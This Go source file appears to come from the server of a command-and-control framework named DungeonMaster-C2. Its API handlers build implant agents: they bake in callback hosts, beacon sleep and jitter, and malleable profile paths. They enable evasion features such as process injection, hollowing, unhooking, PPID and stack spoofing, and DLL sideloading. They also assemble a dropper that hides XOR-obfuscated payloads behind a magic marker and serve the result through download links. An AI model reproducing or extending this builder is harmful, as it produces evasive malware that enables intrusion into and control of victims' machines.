package api

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/db"
	"github.com/BroJustLeaveMeAlone/DungeonMaster-C2/server/internal/storage"
	"github.com/google/uuid"
	"go.uber.org/zap"
)

type buildView struct {
	ID          string     `json:"id"`
	CampaignID  string     `json:"campaign_id,omitempty"`
	Status      string     `json:"status"`
	TargetOS    string     `json:"target_os"`
	TargetArch  string     `json:"target_arch"`
	ArtifactURL string     `json:"artifact_url,omitempty"`
	SHA256      string     `json:"sha256,omitempty"`
	CreatedAt   time.Time  `json:"created_at"`
	CompletedAt *time.Time `json:"completed_at,omitempty"`
}

func (g *gateway) handleCreateBuild(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Config struct {
			CampaignID    string   `json:"campaign_id"`
			ListenerID    string   `json:"listener_id"`
			ProfileName   string   `json:"profile_name"`
			TargetOS      string   `json:"target_os"`
			TargetArch    string   `json:"target_arch"`
			SleepSeconds  int      `json:"sleep_seconds"`
			JitterPct     int      `json:"jitter_pct"`
			Ephemeral     bool     `json:"ephemeral"`
			TLSSkipVerify bool     `json:"tls_skip_verify"`
			SleepEncrypt  bool     `json:"sleep_encrypt"`
			Features      []string `json:"features"`
			SignSubject   string   `json:"sign_subject"`
		} `json:"config"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeError(w, http.StatusBadRequest, "invalid body")
		return
	}

	cfg := req.Config
	if cfg.SleepSeconds == 0 {
		cfg.SleepSeconds = 30
	}
	if cfg.JitterPct == 0 {
		cfg.JitterPct = 20
	}
	if cfg.TargetOS == "" {
		cfg.TargetOS = "windows"
	}
	if cfg.TargetArch == "" {
		cfg.TargetArch = "x64"
	}

	// Resolve listener callback address for agent baking.
	// callback_host is the public/routable address agents dial; bind_host is what
	// the server actually listens on (often 0.0.0.0). Fall back through:
	//   callback_host → bind_host (if specific) → 127.0.0.1 (dev/Docker loopback)
	listenerHost := "127.0.0.1"
	listenerPort := 4443
	if cfg.ListenerID != "" {
		var bindHost, callbackHost string
		var port int
		err := db.Pool.QueryRow(r.Context(),
			`SELECT bind_host, COALESCE(callback_host,''), bind_port FROM listeners WHERE id = $1`, cfg.ListenerID,
		).Scan(&bindHost, &callbackHost, &port)
		if err == nil {
			switch {
			case callbackHost != "":
				listenerHost = callbackHost
			case bindHost != "" && bindHost != "0.0.0.0":
				listenerHost = bindHost
			}
			listenerPort = port
		}
	}

	operatorID := operatorIDFromCtx(r.Context())
	buildUUID := uuid.New().String()

	var campaignID *string
	if cfg.CampaignID != "" && cfg.CampaignID != "00000000-0000-0000-0000-000000000000" {
		campaignID = &cfg.CampaignID
	}

	evasionFlags := fmt.Sprintf(`{"ephemeral":%v}`, cfg.Ephemeral)

	var b buildView
	err := db.Pool.QueryRow(r.Context(), `
		INSERT INTO builds (campaign_id, operator_id, target_os, target_arch,
		                    listener_id, sleep_seconds, jitter_pct, evasion_flags, ephemeral, build_uuid)
		VALUES ($1, $2, $3, $4, $5, $6, $7, $8::jsonb, $9, $10)
		RETURNING id, COALESCE(campaign_id::text,''), status, target_os, target_arch,
		          COALESCE(artifact_url,''), COALESCE(sha256,''), created_at, completed_at`,
		campaignID, operatorID, cfg.TargetOS, cfg.TargetArch,
		nilIfEmpty(cfg.ListenerID), cfg.SleepSeconds, cfg.JitterPct,
		evasionFlags, cfg.Ephemeral, buildUUID,
	).Scan(&b.ID, &b.CampaignID, &b.Status, &b.TargetOS, &b.TargetArch,
		&b.ArtifactURL, &b.SHA256, &b.CreatedAt, &b.CompletedAt)
	if err != nil {
		g.log.Error("create build record", zap.Error(err))
		writeError(w, http.StatusInternalServerError, "create failed")
		return
	}

	// Kick off the build in the background
	go g.runBuild(b.ID, cfg.CampaignID, listenerHost, strconv.Itoa(listenerPort),
		cfg.TargetOS, cfg.TargetArch, cfg.ProfileName, cfg.SleepSeconds, cfg.JitterPct, cfg.TLSSkipVerify, cfg.SleepEncrypt, cfg.Features, cfg.SignSubject)

	writeJSON(w, http.StatusCreated, b)
}

func (g *gateway) handleGetBuild(w http.ResponseWriter, r *http.Request) {
	var b buildView
	err := db.Pool.QueryRow(r.Context(), `
		SELECT id, COALESCE(campaign_id::text,''), status, target_os, target_arch,
		       COALESCE(artifact_url,''), COALESCE(sha256,''), created_at, completed_at
		FROM builds WHERE id = $1`, r.PathValue("id"),
	).Scan(&b.ID, &b.CampaignID, &b.Status, &b.TargetOS, &b.TargetArch,
		&b.ArtifactURL, &b.SHA256, &b.CreatedAt, &b.CompletedAt)
	if err != nil {
		writeError(w, http.StatusNotFound, "build not found")
		return
	}
	writeJSON(w, http.StatusOK, b)
}

func (g *gateway) handleListBuilds(w http.ResponseWriter, r *http.Request) {
	campaignID := r.URL.Query().Get("campaign_id")

	query := `
		SELECT id, COALESCE(campaign_id::text,''), status, target_os, target_arch,
		       COALESCE(artifact_url,''), COALESCE(sha256,''), created_at, completed_at
		FROM builds WHERE 1=1`
	args := []any{}
	n := 1
	if campaignID != "" {
		query += fmt.Sprintf(" AND campaign_id = $%d", n)
		args = append(args, campaignID)
		n++
	}
	query += " ORDER BY created_at DESC LIMIT 50"

	rows, err := db.Pool.Query(r.Context(), query, args...)
	if err != nil {
		g.log.Error("list builds", zap.Error(err))
		writeError(w, http.StatusInternalServerError, "list failed")
		return
	}
	defer rows.Close()

	var out []buildView
	for rows.Next() {
		var b buildView
		if err := rows.Scan(&b.ID, &b.CampaignID, &b.Status, &b.TargetOS, &b.TargetArch,
			&b.ArtifactURL, &b.SHA256, &b.CreatedAt, &b.CompletedAt); err != nil {
			writeError(w, http.StatusInternalServerError, "scan failed")
			return
		}
		out = append(out, b)
	}
	if out == nil {
		out = []buildView{}
	}
	writeJSON(w, http.StatusOK, out)
}

// runBuild executes the Docker build in a background goroutine and updates the build record.
func (g *gateway) runBuild(buildID, campaignID, c2Host, c2Port,
	targetOS, targetArch, profileName string, sleepSecs, jitterPct int, tlsSkipVerify, sleepEncrypt bool, features []string, signSubject string) {

	ctx, cancel := context.WithTimeout(context.Background(), 15*time.Minute)
	defer cancel()

	setBuildStatus := func(status string, artifactURL, sha256 string) {
		_, err := db.Pool.Exec(context.Background(), `
			UPDATE builds SET status = $2, artifact_url = NULLIF($3,''), sha256 = NULLIF($4,''), completed_at = NOW()
			WHERE id = $1`, buildID, status, artifactURL, sha256)
		if err != nil {
			g.log.Error("update build status", zap.String("build_id", buildID), zap.Error(err))
		}
	}

	_, _ = db.Pool.Exec(context.Background(), `UPDATE builds SET status = 'building' WHERE id = $1`, buildID)

	// Resolve cross-compile target and artifact names from TargetOS/TargetArch
	cargoTarget, binName, ext := resolveTarget(targetOS, targetArch)

	// Resolve malleable profile fields (paths, user-agent)
	regPath, pollPath, userAgent := "/r", "/c", ""
	if profileName != "" {
		var ua, rp, pp string
		err := db.Pool.QueryRow(ctx,
			`SELECT user_agent, register_path, poll_path FROM c2_profiles WHERE name = $1`, profileName,
		).Scan(&ua, &rp, &pp)
		if err == nil {
			userAgent, regPath, pollPath = ua, rp, pp
		} else {
			g.log.Warn("profile not found, using defaults", zap.String("profile", profileName))
		}
	}

	imageTag := "dm-agent-build-" + buildID

	tlsSkipVerifyStr := "false"
	if tlsSkipVerify {
		tlsSkipVerifyStr = "true"
	}

	sleepEncryptStr := "false"
	if sleepEncrypt {
		sleepEncryptStr = "true"
	}

	featuresArg := ""
	if len(features) > 0 {
		allowed := map[string]bool{
			"inject-classic": true, "inject-apc": true, "inject-hollow": true,
			"inject-hijack": true, "inject-stomp": true, "unhook": true,
			"ppid-spoof": true, "heap-encrypt": true, "stack-spoof": true,
			"udrl": true, "self-delete": true,
			"channel-tcp": true, "channel-smb": true, "sleep-encrypt": true,
			"process-hollow": true, "dll-sideload": true,
		}
		var validated []string
		for _, f := range features {
			if allowed[f] {
				validated = append(validated, f)
			}
		}
		if len(validated) > 0 {
			featuresArg = strings.Join(validated, ",")
		}
	}

	isDLL := strings.Contains(featuresArg, "dll-sideload")

	buildVolume := os.Getenv("DM_BUILD_VOLUME")
	if buildVolume == "" {
		buildVolume = "dungeonmaster_build_artifacts"
	}

	contentType := "application/octet-stream"
	if ext == ".exe" {
		contentType = "application/vnd.microsoft.portable-executable"
	}

	if signSubject != "" && !strings.HasPrefix(signSubject, "/") {
		parts := strings.Split(signSubject, ",")
		for i, p := range parts {
			parts[i] = strings.TrimSpace(p)
		}
		signSubject = "/" + strings.Join(parts, "/")
	}

	buildArgs := makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
		regPath, pollPath, sleepSecs, jitterPct, buildID, tlsSkipVerifyStr, userAgent,
		sleepEncryptStr, featuresArg, campaignID, signSubject, isDLL)

	buildCmd := exec.CommandContext(ctx, "docker", buildArgs...)
	buildCmd.Env = append(os.Environ(), "DOCKER_BUILDKIT=1")
	buildCmd.Stdout = os.Stdout
	buildCmd.Stderr = os.Stderr
	if err := buildCmd.Run(); err != nil {
		g.log.Error("docker build failed", zap.String("build_id", buildID), zap.Error(err))
		setBuildStatus("failed", "", "")
		return
	}

	if isDLL {
		// DLL sideload: extract DLL + dropper template + stub host, inject payload in Go, upload dropper EXE.
		dllTmp := "/artifacts/" + buildID + "-dll.tmp"
		dropperTmp := "/artifacts/" + buildID + "-dropper.tmp"
		hostTmp := "/artifacts/" + buildID + "-host.tmp"
		extractCmd := exec.CommandContext(ctx,
			"docker", "run", "--rm",
			"-v", buildVolume+":/out",
			imageTag, "sh", "-c",
			"cp /version.dll /out/"+buildID+"-dll.tmp && cp /dm-dropper.exe /out/"+buildID+"-dropper.tmp && cp /sideload-host.exe /out/"+buildID+"-host.tmp",
		)
		if err := extractCmd.Run(); err != nil {
			g.log.Error("docker extract (dll) failed", zap.String("build_id", buildID), zap.Error(err))
			setBuildStatus("failed", "", "")
			return
		}
		exec.Command("docker", "rmi", imageTag).Run() //nolint

		dllBytes, err := os.ReadFile(dllTmp)
		os.Remove(dllTmp)
		if err != nil {
			g.log.Error("read dll artifact", zap.String("build_id", buildID), zap.Error(err))
			setBuildStatus("failed", "", "")
			return
		}
		templateBytes, err := os.ReadFile(dropperTmp)
		os.Remove(dropperTmp)
		if err != nil {
			g.log.Error("read dropper template", zap.String("build_id", buildID), zap.Error(err))
			setBuildStatus("failed", "", "")
			return
		}
		hostBytes, err := os.ReadFile(hostTmp)
		os.Remove(hostTmp)
		if err != nil {
			g.log.Error("read sideload host exe", zap.String("build_id", buildID), zap.Error(err))
			setBuildStatus("failed", "", "")
			return
		}

		dropper := buildDropper(templateBytes, dllBytes, hostBytes)
		outPath := "/artifacts/" + buildID + ext
		if err := os.WriteFile(outPath, dropper, 0644); err != nil {
			g.log.Error("write dropper", zap.String("build_id", buildID), zap.Error(err))
			setBuildStatus("failed", "", "")
			return
		}
		artifactURL, err := storage.UploadFile(ctx, storage.BucketArtifacts, buildID+ext, outPath, contentType)
		os.Remove(outPath)
		if err != nil {
			g.log.Error("minio upload dropper", zap.String("build_id", buildID), zap.Error(err))
			setBuildStatus("failed", "", "")
			return
		}
		downloadURL, _ := storage.PresignedDownloadURL(ctx, storage.BucketArtifacts, buildID+ext)
		if downloadURL == "" {
			downloadURL = artifactURL
		}
		setBuildStatus("complete", downloadURL, "")
		g.log.Info("dropper build complete", zap.String("build_id", buildID))
		return
	}

	outPath := "/artifacts/" + buildID + ext
	extractCmd := exec.CommandContext(ctx,
		"docker", "run", "--rm",
		"-v", buildVolume+":/out",
		imageTag, "sh", "-c", "cp /"+binName+" /out/"+buildID+ext,
	)
	if err := extractCmd.Run(); err != nil {
		g.log.Error("docker extract failed", zap.String("build_id", buildID), zap.Error(err))
		setBuildStatus("failed", "", "")
		return
	}

	exec.Command("docker", "rmi", imageTag).Run() //nolint

	artifactURL, err := storage.UploadFile(ctx, storage.BucketArtifacts, buildID+ext, outPath, contentType)
	if err != nil {
		g.log.Error("minio upload failed", zap.String("build_id", buildID), zap.Error(err))
		setBuildStatus("failed", "", "")
		return
	}

	downloadURL, _ := storage.PresignedDownloadURL(ctx, storage.BucketArtifacts, buildID+ext)
	if downloadURL == "" {
		downloadURL = artifactURL
	}

	setBuildStatus("complete", downloadURL, "")
	g.log.Info("build complete", zap.String("build_id", buildID), zap.String("url", downloadURL))

	os.Remove(outPath)
}

const dropperMagic = "DMSDRPX!"

// buildDropper appends XOR-encrypted DLL and host EXE to the dropper template
// using the magic marker the template searches for at runtime.
func buildDropper(template, dll, hostExe []byte) []byte {
	encDLL := xorPackBytes(dll)
	encEXE := xorPackBytes(hostExe)

	out := make([]byte, 0, len(template)+8+4+len(encDLL)+4+len(encEXE))
	out = append(out, template...)
	out = append(out, []byte(dropperMagic)...)
	out = appendU32LE(out, uint32(len(encDLL)))
	out = append(out, encDLL...)
	out = appendU32LE(out, uint32(len(encEXE)))
	out = append(out, encEXE...)
	return out
}

func xorPackBytes(data []byte) []byte {
	if len(data) == 0 {
		return []byte{0, 0, 0, 0}
	}
	seed := uint32(len(data)) ^
		uint32(data[0]) ^
		(uint32(data[len(data)-1]) << 8)
	key := [4]byte{
		byte(seed >> 24),
		byte(seed>>16) ^ 0xA3,
		byte(seed>>8) ^ 0x7F,
		byte(seed) ^ 0x5C,
	}
	result := make([]byte, 4+len(data))
	copy(result[:4], key[:])
	for i, b := range data {
		result[4+i] = b ^ key[i%4]
	}
	return result
}

func appendU32LE(b []byte, v uint32) []byte {
	return append(b, byte(v), byte(v>>8), byte(v>>16), byte(v>>24))
}

func makeAgentBuildArgs(imageTag, cargoTarget, binName, c2Host, c2Port,
	regPath, pollPath string, sleepSecs, jitterPct int,
	buildID, tlsSkipVerify, userAgent, sleepEncrypt, features, campaignID string,
	signSubject string, isDLL bool) []string {

	dllStr := "false"
	if isDLL {
		dllStr = "true"
	}

	args := []string{
		"build",
		"-f", "/workspace/infra/docker/Dockerfile.agent",
		"--build-arg", "DM_TARGET=" + cargoTarget,
		"--build-arg", "DM_BIN=" + binName,
		"--build-arg", "DM_C2_HOST=" + c2Host,
		"--build-arg", "DM_C2_PORT=" + c2Port,
		"--build-arg", "DM_C2_PATH_REG=" + regPath,
		"--build-arg", "DM_C2_PATH_POLL=" + pollPath,
		"--build-arg", "DM_SLEEP_SECS=" + strconv.Itoa(sleepSecs),
		"--build-arg", "DM_JITTER_PCT=" + strconv.Itoa(jitterPct),
		"--build-arg", "DM_BUILD_UUID=" + buildID,
		"--build-arg", "DM_TLS_SKIP_VERIFY=" + tlsSkipVerify,
		"--build-arg", "DM_NO_EVASION=false",
		"--build-arg", "DM_UA=" + userAgent,
		"--build-arg", "DM_SLEEP_ENCRYPT=" + sleepEncrypt,
		"--build-arg", "DM_FEATURES=" + features,
		"--build-arg", "DM_SIGN_SUBJECT=" + signSubject,
		"--build-arg", "DM_DLL_BUILD=" + dllStr,
	}
	if campaignID != "" && campaignID != "00000000-0000-0000-0000-000000000000" {
		args = append(args, "--build-arg", "DM_CAMPAIGN_ID="+campaignID)
	}
	if regKey := os.Getenv("DM_REG_KEY"); regKey != "" {
		args = append(args, "--build-arg", "DM_REG_KEY="+regKey)
	}
	args = append(args, "-t", imageTag, "/workspace")
	return args
}

func removeFeature(features, remove string) string {
	parts := strings.Split(features, ",")
	kept := parts[:0]
	for _, p := range parts {
		if p != remove {
			kept = append(kept, p)
		}
	}
	return strings.Join(kept, ",")
}

// resolveTarget maps UI target_os/target_arch to Cargo triple, binary name, and file extension.
func resolveTarget(targetOS, targetArch string) (cargoTarget, binName, ext string) {
	switch targetOS {
	case "linux":
		switch targetArch {
		default:
			return "x86_64-unknown-linux-musl", "dm-agent", ""
		}
	default: // windows
		return "x86_64-pc-windows-gnu", "dm-agent.exe", ".exe"
	}
}

func nilIfEmpty(s string) *string {
	if s == "" {
		return nil
	}
	return &s
}

